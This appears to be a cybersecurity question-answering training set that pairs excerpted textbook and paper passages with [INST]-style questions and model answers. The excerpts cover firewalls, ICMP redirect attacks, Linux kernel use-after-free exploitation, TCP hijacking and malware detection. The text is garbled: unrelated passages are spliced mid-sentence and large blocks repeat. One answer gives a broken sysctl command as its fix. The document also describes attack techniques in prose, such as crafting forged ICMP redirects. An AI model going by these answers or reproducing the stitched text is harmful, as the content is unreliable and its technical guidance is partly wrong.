also going to talk about defending your Windows systems by using the  built- in security features called Windows Defender Security Center. I will show you the different  ways that you can protect your system using the Defender Security Center options. I will show you how to protect your Windows client and server devices by using the  Windows Firewall. The Windows Firewall can help protect your client systems from being  illegally breached, but when you\u2019re building a network, your Windows Firewall should NOT be  your only firewall. Your network connection to the Internet should also be protected by some  type of firewall, but that is an entirely different course (depending on your firewall type). I am also going to dive into protecting Windows and also using Azure to help protect your  network. Windows offers protection like Windows Firewall and Azure offers organizations  multiple ways to protect devices and data by using Azure tools like Windows Defender  Application Guard, Windows Defender Advanced Threat Protection, and Windows Defender  Antivirus. So, let\u2019s get started by looking at protecting your Windows devices by using Windows  Firewall. IN THIS CHAPTER YOU\u2019LL LEARN  \u25c6Understand how to configure Windows Firewall  \u25c6Use Windows Defender Application Control Managing Windows Security Without showing my age, I have been in the computer industry for over 30 years. When I first  got into networking, security basically was just protecting files from unauthorized access from  people in your own organization. Today, that is completely changed. We still have to make sure  that our servers and data is protected from unauthorized employee access, but we also have to  spend much of our time protecting our networks from outside threats. Unfortunately, there is no magic pill or solution to stop these external threats. Even if you  decide that you want to completely disconnect your network from the Internet, your organiza-Deny all (packets or services) except those specified as allowedThe \u201cpermit all\u201d policy negates the desired restrictive need for controlled access. Typically, most firewallsimplement the policy of \u201cdeny all except those specified as allowed.\u201d\u00a9 2004 by CRC Press LLCx0c786 Information Security Management HandbookFirewall TypesPacket FiltersPacket filtering firewalls function at the IP layer and examine packet types, letting through only those packetsallowed by the security policy while dropping everything else. Packet filtering can be filtering based on packettype, source and destination IP address, or source and destination TCP/UDP ports. Typically, packet filteringis implemented with routers.The major advantage of packet filters is that they provide security at a relatively inexpensive price as wellas high-level performance. As well, their use remains transparent to users.Packet filters have disadvantages, however. These include:\u2022 They are more difficult to configure, and it is moreIn other words,rather than letting traffic in simply because it is on the right port, it validates that acomputer on the network actually asked to receive the traffic.Stateful inspection also evaluates the context of the communications. If a com-puter on the network requests a Web page from a Web server, the stateful inspectionpacket filter will allow the Web page traffic through. However, if the Web site ismalicious and also attempts to install some malware, a standard packet filter mightallow the traffic because it is in response to a request initiated from your network,but the stateful inspection packet filter will reject it because it is not in the samecontext as the request.This higher degree of scrutiny for incoming packets helps toprotect your network better than a standard packet filter.As you can see in Figure 5.3, stateful inspections used rules or filters to checkthe dynamic state table to verify that the packet is part of a valid connection.Figure 5.3 Stateful Packet                   Question: 'What helps to protect your network and it is better than a standard packet filter?'[/INST] Stateful inspection is a type of packet filtering that goes beyond traditional packet filtering by evaluating the context of the communication. It not only checks the packet header information but also inspects the state of the ongoing connections. This helps protect the network by allowing only legitimate traffic that is part of an established connection and blocking unsolicited traffic. It provides a higher degree of scrutiny compared to standard packet filters, making it more effective in securing the network against potential attacks."}

One of the most popular adver- sarial attacks is evasion attack, which deliberately modifies mali- cious samples in order to evade the detection of a deployed pattern recognition system at test time. However, for the malicious sam- ples far away from the decision boundary of a classifier, a success- ful evasion attack is of high cost, or even impossible. In this paper, we propose a label flips attack to mislead the learning process of a classifier, aiming to decrease the security of a classifier against evasion attack, i.e.,making the evasion attack much easier. The attack samples are greedily selected to minimize the security of a classifier, which is measured by the expected least cost of suc- cessful evasion attacks for the malicious samples. We conducted experiments on spam filtering and malware detection and showed that the proposed label flips attack greatly decreased the security of support vector machines against evasion attack. An attacker can not only conduct a successful evasion attack with less cost, but also achieve higher success rate within the given capability. In order to speed up the proposed label flips attack, we devised a pre- processing technique for selecting the candidate training samples based on a kernel density estimator (KDE).

One of the most popular adver- sarial attacks is evasion attack, which deliberately modifies mali- cious samples in order to evade the detection of a deployed pattern recognition system at test time. However, for the malicious sam- ples far away from the decision boundary of a classifier, a success- ful evasion attack is of high cost, or even impossible. In this paper, we propose a label flips attack to mislead the learning process of a classifier, aiming to decrease the security of a classifier against evasion attack, i.e.,making the evasion attack much easier. The attack samples are greedily selected to minimize the security of a classifier, which is measured by the expected least cost of suc- cessful evasion attacks for the malicious samples. We conducted experiments on spam filtering and malware detection and showed that the proposed label flips attack greatly decreased the security of support vector machines against evasion attack. An attacker can not only conduct a successful evasion attack with less cost, but also achieve higher success rate within the given capability. In order to speed up the proposed label flips attack, we devised a pre- processing technique for selecting the candidate training samples based on a kernel density estimator (KDE). This paper discovers a potential threat to machine learning algorithms, which is of great important for developing a secure system. Keywords:Of all of them, KDE, which is a window environ-ment for Unix and Linux, has become my favorite because of its implementation of the virtualdesktop feature. If you are like me and do several different things at once on your computer,you can use virtual desktops to switch between groups of open programs rather than relying onthe taskbar.A couple of months after Windows XP was released, Microsoft released a Virtual DesktopManager PowerToy. I was extremely happy to be able to get this feature on Windows XP.Although it is not exactly the same as the KDE version because it does not show a preview ofwhat is going on in the window, it allows you to switch between desktops. The Windows XPVirtual Desktop PowerToy works by adding a new toolbar to the taskbar, as shown in Figure 3-8.You can easily switch between your desktops by clicking the numbered buttons.

Among the various dynamic analysis techniques, fuzzing has been highly popular since its invention and a multitude of fuzzing tools of varying sophistication have been developed. It can be enormously fun to take the latest fuzzing tool and see just how many ways you can crash your favorite application. But what if you are a developer of a large project which does not lend itself to being fuzzed easily? How should you approach dynamic analysis in this case?  ### 1. Decide your goalsWeconstruct a packet that looks like it is being sent from the old gateway or routerthat tells the target: \u201cHey there\u2019s someone that can do the job better then me!\u201d.Translated to ICMP that is code 1, type 5, and the gw parameter includes theIP of the new gateway. Last but not least we must set the destination of the route inour case 0.0.0.0 for overwriting the default route. Here you can define any otherroute you like to alter.ICMP redirection attacks can be easily defended against on a Linux system bydeactivating the accept-redirects kernel option. This can be achieved by thefollowing magic line:or by editing /etc/systctl.conf and settingBSD- and Mac OS X systems provide similar functionality.This is a powerful concept that helps to makethe case that a firewall should be deployed on every system; the additional work that iscreated by having to manage the firewall policy is well worth the effort in the face ofrisking potential compromise.Testing the Policy: ICMPFinally, we\u2019ll test the iptables policy over ICMP. The iptables commands usedin the construction of the policy used the --icmp-type option to restrict accept-able ICMP packets to just Echo Request packets (the connection-trackingcode allows the corresponding Echo Reply packets to be sent so an explicitACCEPT rule does not have to be added to allow such replies). Therefore,iptables should be allowing all Echo Request packets, but other ICMP packetsshould be met with stark silence. We test this by generating ICMP Echo Replypackets without sending any corresponding Echo Request packets, whichshould cause iptables to match the packets on the INVALID state rule at thebeginning of the INPUT chain. Again, we turn to hping toParallelly Refill SLUB Objects Freed in Slow Paths   An approach to Exploit the Use-After-Free Vulnerabilities in Linux Kernel     Liu Song   JiangNan Institute of  Computing Technology  Wuxi, China 4LQ Xiao-jun   JiangNan Institute of  Computing Technology   Wuxi, China     Abstract \u2014 recently since exploiting vulnerabilities in user  application is becoming very difficult, vulnerabilities in Linux  kernel have been paid more a nd more attention, especially the  use-after-free vulnerabilities gained the most focus. However,  there lacks a completion theory to exploit use-after-free  vulnerabilities. The key to exploit UAF vulnerability is how to  refill the freed object, because those days that the space just freed  will be occupied firstly is gone.  We propose a strategy to exploit  the use-after-free vulnerabilities  by continuously allocating  objects. And to promote the efficiency and success rate, we  present a technique by parallelly refilling objects with multiple  threads and monitor. We also make a simulation experiment to  verify the effectiveness of our th eory. At last we give some  mitigations to this attack.

INTRODUCTION   The traditional vulnerabilities in  user level applications are  becoming more and more difficult to exploit because of so  many mitigations, such as SSP, NX, ASLR. However, Linux  kernel vulnerabilities get more attentions and the x03quantity is  increasing quickly beyond imagination, which can be seen in  Figure 1 [1].  Figure 1 Linux kernel Vulnerabilities Statistics   On the one hand, the kernel has a huge size of code and  distribution, which exposes bigger surface to attackers. On the  other hand, the kernel vulnerabilities can introduce serious  risks by which attackers will have  full control of the Linux  system.  Those reasons above make Linux kernel vulnerabilitiesBGP games were in large partthe basis for the L0pht\u2019s claim before the U.S. Congress a few years ago that theycould take down the Internet in 30 minutes.A more locally workable attack might be to spoof Internet Control MessageProtocol (ICMP) and redirect packets to fool some hosts into thinking that thereis a better route via the attacker\u2019s IP address. Many OSs accept ICMP redirects intheir default configuration. I\u2019ve had some Solaris SPARC 2.5.1 machines pick upnew routes from ICMP redirects and then refuse to give them up without areboot. (Some sort of kernel bug caused the machine to get into a weird statethat refused to accept route update calls.) Unless you want to break the connec-tion entirely (or you proxy it in some way), you\u2019ll have to forward the packetsback to the real router so they can reach their ultimate destination.When thathappens, the real router is likely to send ICMP redirect packets to the originalhost, too, informing it that there is a better route.", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

Among the various dynamic analysis techniques, fuzzing has been highly popular since its invention and a multitude of fuzzing tools of varying sophistication have been developed. It can be enormously fun to take the latest fuzzing tool and see just how many ways you can crash your favorite application. But what if you are a developer of a large project which does not lend itself to being fuzzed easily? How should you approach dynamic analysis in this case?  ### 1. Decide your goalsWeconstruct a packet that looks like it is being sent from the old gateway or routerthat tells the target: \u201cHey there\u2019s someone that can do the job better then me!\u201d.Translated to ICMP that is code 1, type 5, and the gw parameter includes theIP of the new gateway. Last but not least we must set the destination of the route inour case 0.0.0.0 for overwriting the default route. Here you can define any otherroute you like to alter.ICMP redirection attacks can be easily defended against on a Linux system bydeactivating the accept-redirects kernel option. This can be achieved by thefollowing magic line:or by editing /etc/systctl.conf and settingBSD- and Mac OS X systems provide similar functionality.This is a powerful concept that helps to makethe case that a firewall should be deployed on every system; the additional work that iscreated by having to manage the firewall policy is well worth the effort in the face ofrisking potential compromise.Testing the Policy: ICMPFinally, we\u2019ll test the iptables policy over ICMP. The iptables commands usedin the construction of the policy used the --icmp-type option to restrict accept-able ICMP packets to just Echo Request packets (the connection-trackingcode allows the corresponding Echo Reply packets to be sent so an explicitACCEPT rule does not have to be added to allow such replies). Therefore,iptables should be allowing all Echo Request packets, but other ICMP packetsshould be met with stark silence. We test this by generating ICMP Echo Replypackets without sending any corresponding Echo Request packets, whichshould cause iptables to match the packets on the INVALID state rule at thebeginning of the INPUT chain. Again, we turn to hping toParallelly Refill SLUB Objects Freed in Slow Paths   An approach to Exploit the Use-After-Free Vulnerabilities in Linux Kernel     Liu Song   JiangNan Institute of  Computing Technology  Wuxi, China 4LQ Xiao-jun   JiangNan Institute of  Computing Technology   Wuxi, China     Abstract \u2014 recently since exploiting vulnerabilities in user  application is becoming very difficult, vulnerabilities in Linux  kernel have been paid more a nd more attention, especially the  use-after-free vulnerabilities gained the most focus. However,  there lacks a completion theory to exploit use-after-free  vulnerabilities. The key to exploit UAF vulnerability is how to  refill the freed object, because those days that the space just freed  will be occupied firstly is gone.  We propose a strategy to exploit  the use-after-free vulnerabilities  by continuously allocating  objects. And to promote the efficiency and success rate, we  present a technique by parallelly refilling objects with multiple  threads and monitor. We also make a simulation experiment to  verify the effectiveness of our th eory. At last we give some  mitigations to this attack.  Keywords\u2014Slow paths;Linux kernel vulnerability; Use-After-Free;  SLUB  I. INTRODUCTION   The traditional vulnerabilities in  user level applications are  becoming more and more difficult to exploit because of so  many mitigations, such as SSP, NX, ASLR. However, Linux  kernel vulnerabilities get more attentions and the x03quantity is  increasing quickly beyond imagination, which can be seen in  Figure 1 [1].  Figure 1 Linux kernel Vulnerabilities Statistics   On the one hand, the kernel has a huge size of code and  distribution, which exposes bigger surface to attackers. On the  other hand, the kernel vulnerabilities can introduce serious  risks by which attackers will have  full control of the Linux  system.  Those reasons above make Linux kernel vulnerabilitiesBGP games were in large partthe basis for the L0pht\u2019s claim before the U.S. Congress a few years ago that theycould take down the Internet in 30 minutes.A more locally workable attack might be to spoof Internet Control MessageProtocol (ICMP) and redirect packets to fool some hosts into thinking that thereis a better route via the attacker\u2019s IP address. Many OSs accept ICMP redirects intheir default configuration. I\u2019ve had some Solaris SPARC 2.5.1 machines pick upnew routes from ICMP redirects and then refuse to give them up without areboot. (Some sort of kernel bug caused the machine to get into a weird statethat refused to accept route update calls.) Unless you want to break the connec-tion entirely (or you proxy it in some way), you\u2019ll have to forward the packetsback to the real router so they can reach their ultimate destination.When thathappens, the real router is likely to send ICMP redirect packets to the originalhost, too, informing it that there is a better route.                   Question: 'How can ICMP redirection attacks be easily defended on a Linux system and What can be easily defended against on a Linux system by deactivating the accept-redirects kernel option?'[/INST] ICMP redirection attacks can be easily defended against on a Linux system by deactivating the accept-redirects kernel option. This can be achieved by adding the following line to the sysctl.conf file or by running the command \"echo net.ipv4.conf.all.accept_redirects = 0 > /proc/sys/net/ipv4/conf/all/accept_redirects\" in the terminal. This disables the acceptance of ICMP redirect messages, preventing the routing table from being modified without proper authorization."}

Note that even if        a connection-oriented protocol like TCP is used, an application still        needs time-outs and reconnection to handle server crashes.             There are other possibilities for transports besides datagram- or        connection-oriented protocols.  For example, a request-reply protocol        such as VMTP [2] is perhaps a natural transport for RPC.  ONC RPC        uses both TCP and UDP transport protocols.  Section 10 (RECORD        MARKING STANDARD) describes the mechanism employed by ONC RPC to        utilize a connection-oriented, stream-oriented transport such as TCP.          5. BINDING AND RENDEZVOUS INDEPENDENCE             The act of binding a particular client to a particular service and        transport parameters is NOT part of this RPC protocol specification.        This important and necessary function is left up to some higher-level        software.             Implementors could think of the RPC protocol as the jump-subroutine        instruction (\"JSR\") of a network; the loader (binder) makes JSR        useful, and the loader itself uses JSR to accomplish its task.        Likewise, the binding software makes RPC useful, possibly using RPC        to accomplish this task.          6. AUTHENTICATION             The RPC protocol provides the fields necessary for a client to        identify itself to a service, and vice-versa, in each call and reply        message.  Security and access control mechanisms can be built on top        of this message authentication.  Several different authentication        protocols can be supported.  A field in the RPC header indicates        which protocol is being used. More information on specific        authentication protocols is in section 9: \"Authentication Protocols\".          7.

No matter how well your system security is set up, there are almost always times  when computers on your network can\u2019t use IPsec. This is when you set up authenticated  exceptions. It\u2019s important to understand that when you set up these authenticated exceptions,  you are reducing the security of the network because it allows computers to send unprotected  IPsec network traffic. So make sure that the computers that are added to the authenticated  exceptions list are managed and trusted computers only.

Note that even if        a connection-oriented protocol like TCP is used, an application still        needs time-outs and reconnection to handle server crashes.             There are other possibilities for transports besides datagram- or        connection-oriented protocols.  For example, a request-reply protocol        such as VMTP [2] is perhaps a natural transport for RPC.  ONC RPC        uses both TCP and UDP transport protocols.  Section 10 (RECORD        MARKING STANDARD) describes the mechanism employed by ONC RPC to        utilize a connection-oriented, stream-oriented transport such as TCP.          5. BINDING AND RENDEZVOUS INDEPENDENCE             The act of binding a particular client to a particular service and        transport parameters is NOT part of this RPC protocol specification.        This important and necessary function is left up to some higher-level        software.             Implementors could think of the RPC protocol as the jump-subroutine        instruction (\"JSR\") of a network; the loader (binder) makes JSR        useful, and the loader itself uses JSR to accomplish its task.        Likewise, the binding software makes RPC useful, possibly using RPC        to accomplish this task.          6. AUTHENTICATION             The RPC protocol provides the fields necessary for a client to        identify itself to a service, and vice-versa, in each call and reply        message.  Security and access control mechanisms can be built on top        of this message authentication.  Several different authentication        protocols can be supported.  A field in the RPC header indicates        which protocol is being used. More information on specific        authentication protocols is in section 9: \"Authentication Protocols\".          7.

No matter how well your system security is set up, there are almost always times  when computers on your network can\u2019t use IPsec. This is when you set up authenticated  exceptions. It\u2019s important to understand that when you set up these authenticated exceptions,  you are reducing the security of the network because it allows computers to send unprotected  IPsec network traffic. So make sure that the computers that are added to the authenticated  exceptions list are managed and trusted computers only.

You can choose for it to happen eitherinteractively like in Ettercap (http://ettercap.sourceforge.net) or automatically likein P.A.T.H. (http://p-a-t-h.sourceforge.net).Since the author of this book is also one of the authors of the                   Question: 'What do you use to sign your IP packets cryptographically and What is a mechanism to inject customcommands into an existing TCP connection?'[/INST] To sign IP packets cryptographically and ensure their authenticity, you can use a security protocol like IPsec. IPsec provides encryption, authentication, and integrity services for IP packets. By signing IP packets with IPsec, you can protect the data from being tampered with during transmission.\n\nRegarding the second question, a mechanism to inject custom commands into an existing TCP connection is called a TCP hijacking toolkit. One such tool is the Automatic Hijack Daemon, which can be configured to automatically inject custom commands into an existing TCP connection. This can be done interactively, similar to Ettercap, or automatically, like in P.A.T.H. However, it's important to note that such activities are illegal and unethical, and they can lead to serious security vulnerabilities and breaches. It's essential to use such tools responsibly and ethically, only for legitimate purposes and with proper authorization."}

During the past few years, however, the kernel has become anequally attractive target. Continuing the increasing tren d of the previous years, in 2013 there were 355 reported kernel vulnerabilities according to the National Vulnera- bility Database, 140 more than in 2012 [73]. Admittedly, the exploitation of user-level software has become much harder, as recent versions of popular OSes come with nu- merous protections and exploit mitigations. The princi- ple of least privilege is better enforced in user accounts and system services, compilers offer more protections against common software \ufb02aws, and highly targeted ap- plications, such as browsers and document viewers, have started to employ sandboxing. On the other hand, the kernel has a huge codebase and an attack surface that keeps increasing due to the constant addition of new fea- tures [63]. Indicatively, the size of the Linux kernel in terms of lines of code has more than doubled, from 6.6 MLOC in v2.6.11 to 16.9 MLOC in v3.10 [32]. Naturally, instead of putting signi\ufb01cant effort to ex- ploit applications forti\ufb01ed with numerous protections and sandboxes, attackers often turn their attention to the kernel. By compromising the kernel, they can el- evate privileges, bypass access control and policy en- forcement, and escape isolation and con\ufb01nement mech- anisms. For instance, in recent exploits against Chrome and Adobe Reader, after successfully gaining code ex- ecution, the attackers exploited kernel vulnerabilities t o break out of the respective sandboxed processes [5, 74]. Opportunities for kernel exploitation are abundant. As an example consider the Linux kernel, which has been plagued by common software \ufb02aws, such as stack and heap buffer over\ufb02ows [14, 23, 26], NULL pointer and pointer arithmetic errors [10, 12], memory disclosure\"Keywords \u2014msfvenom, rooted android device, android 7 nougat,  security I. INTRODUCTION A. Background of the Study Rooting or jailbreaking, specifically on an iPhone, is a  technique of gaining access to the root directory of a devices  operating system. With rooting or jailbreaking, a user can nearly  wholly manage every part of the device and install any program or software the user desire to use without any restrictions. According to Kaspersky\u2019s data [1], people use Kingroot, 360 Root, Framaroot, Baidu Easy Ro ot, Towelroot, One Click Root,  and Mgyun to gain superuser access rights. However, many of these applications show advertisements or install adware or malware on a device. The device behavior is not necessarily malicious, but nothing good comes of it.  Rooting  gives users, the privileges to modify the  software/device code and install any software that the device would not usually allow. Furthermore, rooting gives users the  perks to fully customize themes and download any application  regardless of the application store that they came from. Aside from these advantages, there were also downsides to rooting a device. The first disadvantage is that a user can turn the smartphone into a brick. Secondly, it voids the devices warranty, and malware can easily breach the device\u2019s security because of  the installed unmodified version [2]. Based on an article written by Neil DuPaul [3], mobile  malware emerged in early 2004, which targets the Symbian OS, but it exploded in 2011. The programs install themselves or are installed on the device by unwitting mobile users and then  performing their purpose without the user\u2019s knowledge or permission. These malicious mobile applications are often  disguised as legitimate applications, downloaded from the app  stores, mobile browsers, or even through messages. There are some objectives of mobile malware: spying to keylogging, from a text messa ge to phishing, and from unwanted marketing to\"outperformed a model based on the long short-term memory  (LSTM) architecture [7] for the task of malware classification.

Background   a) Malware and System Calls  Modern operating systems have a separation between  u ser-mode code and kernel-mode code.

During the past few years, however, the kernel has become anequally attractive target. Continuing the increasing tren d of the previous years, in 2013 there were 355 reported kernel vulnerabilities according to the National Vulnera- bility Database, 140 more than in 2012 [73]. Admittedly, the exploitation of user-level software has become much harder, as recent versions of popular OSes come with nu- merous protections and exploit mitigations. The princi- ple of least privilege is better enforced in user accounts and system services, compilers offer more protections against common software \ufb02aws, and highly targeted ap- plications, such as browsers and document viewers, have started to employ sandboxing. On the other hand, the kernel has a huge codebase and an attack surface that keeps increasing due to the constant addition of new fea- tures [63]. Indicatively, the size of the Linux kernel in terms of lines of code has more than doubled, from 6.6 MLOC in v2.6.11 to 16.9 MLOC in v3.10 [32]. Naturally, instead of putting signi\ufb01cant effort to ex- ploit applications forti\ufb01ed with numerous protections and sandboxes, attackers often turn their attention to the kernel. By compromising the kernel, they can el- evate privileges, bypass access control and policy en- forcement, and escape isolation and con\ufb01nement mech- anisms. For instance, in recent exploits against Chrome and Adobe Reader, after successfully gaining code ex- ecution, the attackers exploited kernel vulnerabilities t o break out of the respective sandboxed processes [5, 74]. Opportunities for kernel exploitation are abundant. As an example consider the Linux kernel, which has been plagued by common software \ufb02aws, such as stack and heap buffer over\ufb02ows [14, 23, 26], NULL pointer and pointer arithmetic errors [10, 12], memory disclosure\"Keywords \u2014msfvenom, rooted android device, android 7 nougat,  security I. INTRODUCTION A. Background of the Study Rooting or jailbreaking, specifically on an iPhone, is a  technique of gaining access to the root directory of a devices  operating system. With rooting or jailbreaking, a user can nearly  wholly manage every part of the device and install any program or software the user desire to use without any restrictions. According to Kaspersky\u2019s data [1], people use Kingroot, 360 Root, Framaroot, Baidu Easy Ro ot, Towelroot, One Click Root,  and Mgyun to gain superuser access rights. However, many of these applications show advertisements or install adware or malware on a device. The device behavior is not necessarily malicious, but nothing good comes of it.  Rooting  gives users, the privileges to modify the  software/device code and install any software that the device would not usually allow. Furthermore, rooting gives users the  perks to fully customize themes and download any application  regardless of the application store that they came from. Aside from these advantages, there were also downsides to rooting a device. The first disadvantage is that a user can turn the smartphone into a brick. Secondly, it voids the devices warranty, and malware can easily breach the device\u2019s security because of  the installed unmodified version [2]. Based on an article written by Neil DuPaul [3], mobile  malware emerged in early 2004, which targets the Symbian OS, but it exploded in 2011. The programs install themselves or are installed on the device by unwitting mobile users and then  performing their purpose without the user\u2019s knowledge or permission. These malicious mobile applications are often  disguised as legitimate applications, downloaded from the app  stores, mobile browsers, or even through messages. There are some objectives of mobile malware: spying to keylogging, from a text messa ge to phishing, and from unwanted marketing to\"outperformed a model based on the long short-term memory  (LSTM) architecture [7] for the task of malware classification.

Background   a) Malware and System Calls  Modern operating systems have a separation between  u ser-mode code and kernel-mode code. This separation is key  to the enforcement of security protocols, user space  separation, preventing race conditions between different  processes or services, and more. Kernel-mode code has more  privileges than user-mode code, including direct access to  physical hardware, control of RAM allocations, read/write  access to the hard drive, etc.  The basic functionality of any operating system is executed in  kernel-mode as well as hardware device drivers (e.g., network  interface cards, hard drives, audio).

This approach allows for more control over who has administrative access to the system and reduces the risk of accidental or intentional misuse of those privileges. However, if a separate local account with administrator privileges is provided, it is essential to ensure that the account is properly secured and that the user understands the responsibilities and limitations associated with using it. Additionally, implementing the principle of least privilege, where users are given only the necessary permissions to perform their job functions, further enhances security."}

These protocols use a combination of symmetric and asymmetric encryption algorithms to establish a secure connection between a client and a server. The use of digital certificates in the X.509 format is also common in these protocols for identity verification and public key exchange.\n\nA man-in-the-middle (MITM) attack on asymmetric cryptography refers to an attack where an attacker intercepts and alters the communication between two parties who believe they are communicating directly with each other. In the context of web communication, an MITM attacker would position themselves between the client and the server, allowing them to intercept and modify the data being transmitted. This could result in data theft, manipulation, or even impersonation of one or both parties involved in the communication.\n\nThe text mentions a diagram of Figure 4.8, but it's not included in the provided context. Based on the description, it seems to depict a scenario where an attacker compromises the external router for a company to carry out a MITM attack."}

The focus of adversarial AI attacks currently  tends to deal with data poisoning, providing security and analytic AI and ML algorithms  with adversarial input that serves the attacker\u2019s purposes, or attacks against privacy. It helps to better understand two key terms in use here. The first is artificial intelligence ,  which focuses on accomplishing \u201csmart\u201d tasks by combining ML, deep learning, and  related techniques that are intended to emulate human intelligence. The second is machine  learning , which is a subset of AI. ML systems modify themselves as they evolve to become  better at the task that they are set to accomplish.58 Chapter 3 \u25a0 Malicious Code Adversarial intelligence is part of 1.2\u2019s coverage of potential indicators of  attack. Though the body of knowledge around actual attacks based on these  techniques is small, you can expect it to grow as more and more organiza -ume and complexity of modern malware, traditional detection methods face scalability and real-time response challenges. Lack of signatures: An increase in fileless malware that does not leave detectable traces on a disk renders signature-based detection methods ineffective. In addition to these open issues, the current literature lacks comprehensive defense solutions, accurate model validation, diverse and large datasets, cross-platform detection methods, and computational complexity.

THE CRITICAL RESEARCH GAPS IN THE LITERATURE ARE AS FOLLOWS 1) DEVELOPMENT OF MULTILAYERED DEFENSE MECHANISMS This study discusses the limitations of single-layer defense mechanisms and the need for more comprehen- sive approaches. Future research could explore multilayered defense mechanisms by including more security layers to protect against different phases, such as analyzing network traffic, monitoring system activities, and integrating contex- tual information (e.g., user behavior) for accurate multistage attack detection and false positive reduction. In addition, this review reveals some potential areas for the future exploration of multilayered defense mechanisms, such as their inherent complexity, resource allocation, and associated costs. 2) DEVELOPMENT OF A CROSS-DEVICE CRYPTOJACKING DETECTION AND PROTECTION MECHANISM Most existing studies focus on a particular type of architecture that does not address group device security. As cryptojacking attacks can affect a wide range of devices, including desktops, mobile phones, and IoT devices, it could be useful to develop a solution that can comprehensively detect and preventthese attacks. This solution could involve machine-learning algorithms and deep neural networks that can detect patterns and anomalies in device behavior without needing spe- cific signatures. Potential suspicious activities to be flagged include high CPU usage, increased power consumption, sus- picious network activities, and other system activity logs.Tayyab et al. [19], and Gopinath and Sethuraman [20]. How- ever, these studies lacked a comparison with other techniques and temporal effectiveness analysis. Aslan and Samet [21] and Roseline and Geetha [22] surveyed detection and mit- igation techniques but lacked a performance evaluation. Huang et al. [23] and Zhang et al. [24] explored malware detection through evasion tactics and memory forensics but did not address the evolution or practicality of defiance strategies. Shaukat et al.

Hence, comprehen- sive research is required to provide a complete picture of malware evolution, contemporary attack trends, and defense solutions. To our knowledge, no studies have been conducted on this topic. This is a significant research gap as technology advances and more devices are connected to global networks, thereby increasing the number of attack surfaces. However, an understanding of these threats is incomplete without a parallel study of the defense strategies designed to combat them. This study aims to fill these gaps by comprehensively reviewing current malware attack trends and defense strate- gies. In this study, we explored malware evolution, ranging from the Creeper virus (1971) to widespread ransomware and other currently evolving attacks, to better understand the trends and tactics employed in such attacks, as illustrated in Figure 2. Our analysis revealed the latest sophisticated attack trends, including a dramatic increase in cryptojack- ing, ransomware attacks, APTs, supply chain attacks, fileless malware, and malware attacks on mobile devices, Internet of Things devices, and edge networks.

The solutions range from improved user education, throughtechnology, to writing better software. Most security professionals subscribe tothe theory of defense in depth, which states that more layers of defense arebetter than fewer layers. Of course, this theory applies to any kind of security.Consider the security of a house without a door lock, with a door lock, andwith a lock and an alarm.

That makes security that prevents attackers from gaining access to the  systems through vulnerabilities, compromised accounts, and other means one of the most  important layers of defense. The Bash shell has a built-in security mode called the restricted shell that  limits what users can do, including things like specifying command names  containing slashes, importing function definitions from the shell environ - ment, and others. These can limit the ability of attackers to leverage Bash as  a tool for their attacks. Fortunately, there are existing tools to search for rootkits like chkrootkit and rkhunter,  which can help defenders search for and identify rootkits.

Analysts or system administrators oftencheck logs or patches if they suspect an attack might havesucceeded. However, this method is very time-consumingand vulnerable to system tampering. Another way to de-termine whether a system has been compromised isthrough backdoor signatures, which check for traf\ufb01c onunusual ports or match on commands an attacker is likelyto use. Unfortunately, encrypted backdoors and covertchannels reduce this technique\u2019s effectiveness. Finally,anomaly-based detection methods such as data mining,correlation, and traf\ufb01c analysis are particularly effective inrecognizing unauthorized network traf\ufb01c or suspicioususer activities resulting from intrusions. Enhancing network forensics Our research uses the Metasploit Framework (www.metasploit.com) and a test network of Windows com-puters to determine server response to buffer over\ufb02ows.In six of the seven TCP buffer-over\ufb02ow exploits tested,we found that patched servers returned unique applica-tion-layer responses. User Datagram Protocol (UDP) at-tacks are, by de\ufb01nition, connectionless and thereforearen\u2019t good candidates for response analysis. The results inTable 1 are consistent across Windows 2000 and XP ser-vice packs. A response of \u201cnone\u201d means that we receivedeither no packets or only a transport-layer response (such as an  ACKpacket). The error message\u2019s size is a useful fac-\"intrusion_detection_data.csv\" dataset. Once trained, the script  uses the trained model to detect any intrusions that Snort may  have omitted. Finally, the script establishes a threshold for the  number of detected intrusions within a 60-second interval. If  the number of detected intrusions for a particular signature ID  exceeds this threshold, an alert is generated to inform the user  that an intrusion has been detected.    Fig. 1.  Dataflow diagram of the proposed script  This code is an example of intrusion detection in a  distributed firewall using machine learning algorithms and the  PyShark library. It begins a traffic capture on the primary  firewall and filters packets based on the IP addresses of each  secondary firewall. Snort, an open-source intrusion detection  application, is then used to detect intrusions in the packets that  have been filtered. Using the \"intrusion_detection_data.csv\"  dataset, the code trains a Random Forest classification model  prior to detecting intrusions. This dataset contains  characteristics of network packets, including protocol, source  and destination IP addresses, source and destination ports, and  labels indicating whether the packet is legitimate or an  intrusion attempt. The model is trained to classify messages  into normal or intrusion categories. A decision threshold is set  to detect intrusions based on the probability of classifying  packets as an intrusion attempt after the model has been  trained. In the provided code example, this threshold has been  set to 0.5. Next, the code filters packets on each secondary  firewall and uses Snort to detect intrusions in the packets that  have been filtered. It then verifies detected intrusions and adds them to a dictionary for future reference. If an intrusion is  detected for the first time, a dictionary entry is created with the  detection time and the number of detections. If the intrusion  has been detected in the past, this condition examines to see ifAlthough it can identify violations to our security policy caused by tainted input, it cannot recover and track path constraints. Thus, in our system, we apply concolic execution to trace the path that the exploit runs on the program. We ensure tracingaccuracy in two ways: we record a dynamic trace of the exploit process (and require that our symbolic trace conform to the same instructions), and we pre-constrain the symbolic data to be equal to the original exploit. The former avoids the path explosion inherent in concolic execution exploration (because we only care about the branch that the exploit chooses), and the latter greatly simpli\ufb01es the job of the symbolic constraint solver during tracing (by providing it with a pre-determined solution). This method is similar to the pre-constraint tracing and the input pre-constraining approach proposed by Driller [ 30] (and, in fact, part of the implementation derives off of Driller\u2019s tracing module). The trace-directed symbolic execution takes a program and an original exploit and produces path constraints and the exploitable state. The exploitable state includes the symbolic value of registers and memory at the moment that the program starts to execute the shellcode. After this step completes,the pre-constraints introduced in the beginning are removed,making it possible to constrain some of the memory in the exploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program toexploitable state to contain values representing, for example, the replacement shellcode. The remaining path constraints guarantee that any satisfying input will make the program to execute the same execution trace and triggers the vulnerability. IV . S HELLCODE TRANSPLANT After the exploitable state and the path constraints associated with it have been recovered, ShellSwap can attempt to re-\"calculations, the actual system can be obtained with the  model-the real optimal solution when the actual difference  exists, and the correlation between the subsystems can be a  non-linear correlation.  B. Complex System Network Intrusion  Anomaly detection is also called behavior-based detection,  which realizes detection by observing the difference between  the current activity and the historical normal activity of the  system. Anomaly 